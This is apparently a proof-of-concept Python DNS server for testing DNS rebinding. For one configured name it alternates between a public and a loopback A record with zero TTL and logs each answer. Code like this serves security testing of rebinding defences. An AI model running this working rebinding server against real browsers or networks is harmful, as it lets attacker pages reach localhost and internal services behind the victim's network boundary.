#!/usr/bin/env python3
"""Tiny test-only DNS server that alternates public and loopback A answers."""

import ipaddress
import json
import os
import socket
import struct

HOST = "0.0.0.0"
PORT = 53
TARGET = os.environ.get("POC_REBIND_TARGET", "example.com").lower().rstrip(".")
PUBLIC_IP = os.environ.get("POC_REBIND_PUBLIC_IP", "1.1.1.1")
PRIVATE_IP = os.environ.get("POC_REBIND_PRIVATE_IP", "127.0.0.1")
count = 0


def read_name(packet, offset):
    labels = []
    while offset < len(packet):
        size = packet[offset]
        offset += 1
        if size == 0:
            break
        if size & 0xC0:
            raise ValueError("compressed question name is not supported")
        labels.append(packet[offset:offset + size].decode("ascii"))
        offset += size
    return ".".join(labels).lower().rstrip("."), offset


def answer(packet):
    global count
    if len(packet) < 17:
        return None
    ident, request_flags, qdcount = struct.unpack("!HHH", packet[:6])
    if qdcount != 1:
        return None
    name, end = read_name(packet, 12)
    qtype, qclass = struct.unpack("!HH", packet[end:end + 4])
    question_end = end + 4
    response_flags = 0x8000 | 0x0080 | (request_flags & 0x0100)
    records = b""
    answers = 0
    if name == TARGET and qtype == 1 and qclass == 1:
        count += 1
        chosen = PUBLIC_IP if count % 2 else PRIVATE_IP
        packed = ipaddress.ip_address(chosen).packed
        records = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, 0, len(packed)) + packed
        answers = 1
        print(json.dumps({"query": name, "answer": chosen, "sequence": count}), flush=True)
    header = struct.pack("!HHHHHH", ident, response_flags, 1, answers, 0, 0)
    return header + packet[12:question_end] + records


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        print(json.dumps({"event": "dns-listening", "target": TARGET, "public_ip": PUBLIC_IP,
                          "private_ip": PRIVATE_IP, "port": PORT}), flush=True)
        while True:
            packet, peer = server.recvfrom(4096)
            try:
                response = answer(packet)
                if response:
                    server.sendto(response, peer)
            except Exception as exc:
                print(json.dumps({"event": "dns-error", "error": str(exc)}), flush=True)


if __name__ == "__main__":
    main()
